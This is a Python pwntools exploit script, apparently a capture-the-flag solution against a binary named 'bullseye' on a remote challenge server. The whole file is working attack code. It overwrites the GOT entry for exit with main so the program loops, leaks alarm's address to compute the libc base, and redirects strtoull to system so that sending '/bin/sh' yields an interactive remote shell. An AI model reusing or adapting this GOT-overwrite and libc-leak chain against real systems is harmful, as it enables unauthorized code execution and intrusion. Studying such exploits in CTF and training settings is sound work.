from pwn import *


_FILE = "./bullseye"
#_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
#_LIBC = "libc.so.6"

_LIBC = "libc6_2.30-0ubuntu2.1_amd64.so"

p = remote("jh2i.com", 50031)
#p = process(_FILE)
#gdb.attach(p.pid)

binary = ELF(_FILE, checksec=False)
_libc = ELF(_LIBC, checksec=False)



def format_addr(address):
    return str(hex(address))[2:].rjust(16, "0")

payload = format_addr(binary.got['exit']) # "00000000004040580000000000401260"
payload += format_addr(binary.sym["main"])

log.info(f"Sending {payload}")

p.clean()

p.send(payload)

p.recvuntil("?\n")
_alarm = int(p.recvline().strip()[2:], 16)

log.success(f"Alram addr: {hex(_alarm)}")

_libc.address = _libc.address + (_alarm - _libc.sym['alarm'])

log.warn("Make sure you check the right Libc file")
log.success(f"Libc Addr: {hex(_libc.address)}")

p.clean()

payload = format_addr(binary.got['strtoull'])
payload += format_addr(_libc.sym["system"])

p.send(payload)

p.clean()
p.send("/bin/sh\x00")
p.interactive()
